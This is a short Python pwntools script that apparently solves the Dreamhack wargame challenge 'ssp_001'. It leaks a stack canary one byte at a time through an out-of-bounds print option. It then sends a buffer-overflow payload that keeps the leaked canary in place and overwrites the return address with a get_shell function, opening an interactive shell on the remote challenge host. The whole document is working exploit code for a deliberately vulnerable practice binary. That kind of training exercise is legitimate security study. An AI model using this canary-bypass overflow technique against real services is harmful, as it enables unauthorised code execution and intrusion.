```python
from pwn import *

def slog(n, m): return success(': '.join([n, hex(m)]))

context.log_level = "debug"
context.binary = '/home/user/Desktop/Dreamhack/33/ssp_001'
context.terminal = ['tmux', 'splitw', '-h']
context.gdb_binary = '/usr/local/bin/pwndbg'

# p = process(context.binary.path)
p = remote(host="host3.dreamhack.games", port=22571)

canary = []
for i in range(128, 132):
    p.sendlineafter(b'> ', b'P')
    p.sendlineafter(b': ', b'%d' % i)
    p.recvuntil(b'is : ')
    canary.append(int(p.recvn(2), 16))

canary = u32(bytes(canary))
slog("canary : ", canary)

payload = b'A'*0x40
payload += p32(canary)
payload += b'B'*0x4 # sfp
payload += b'C'*0x4 # saved edi(callee-saved)
payload += p32(0x080486b9) # get_shell addr

p.sendlineafter(b'> ', b'E')
p.sendlineafter(b': ', b'%d' % len(payload))
p.sendlineafter(b': ', payload)
p.interactive()
```
